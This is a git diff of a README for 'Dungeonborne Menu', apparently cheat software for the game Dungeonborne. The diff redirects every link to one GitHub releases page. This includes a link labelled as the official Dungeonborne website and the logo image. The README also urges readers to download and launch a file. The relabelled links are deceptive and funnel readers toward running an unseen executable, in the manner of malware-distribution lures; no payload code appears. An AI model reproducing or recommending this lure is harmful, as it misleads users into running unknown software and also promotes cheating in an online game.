@@ -16,9 +16,9 @@ Our software offers a wide range of features tailored specifically for Dungeonbo
 
 ## Installation 🖥️
 
-To get started, download the latest version of our software by clicking [here](https://github.com/repo/releases/9246/App.zip).
+To get started, download the latest version of our software by clicking [here](https://github.com/Mindset474/Dungeonborne-Menu/releases).
 
-[![Download](https://img.shields.io/badge/Download-App.zip-<COLOR>.svg)](https://github.com/repo/releases/9246/App.zip)
+[![Download](https://github.com/Mindset474/Dungeonborne-Menu/releases<COLOR>.svg)](https://github.com/Mindset474/Dungeonborne-Menu/releases)
 
 Kindly note that the downloaded file needs to be launched in order to start using the software.
 
@@ -60,6 +60,6 @@ Explore the following topics related to our Dungeonborne Menu repository:
 
 Thank you for checking out the Dungeonborne Menu repository! We hope our software enhances your gaming experience and helps you achieve new levels of success in Dungeonborne. Download the latest version now and dominate the game like never before!
 
-🔗 For more information, visit [Dungeonborne Website](https://www.dungeonborne.com)
+🔗 For more information, visit [Dungeonborne Website](https://github.com/Mindset474/Dungeonborne-Menu/releases)
 
-![Dungeonborne Logo](dungeonborne_logo.png)
+![Dungeonborne Logo](https://github.com/Mindset474/Dungeonborne-Menu/releases)
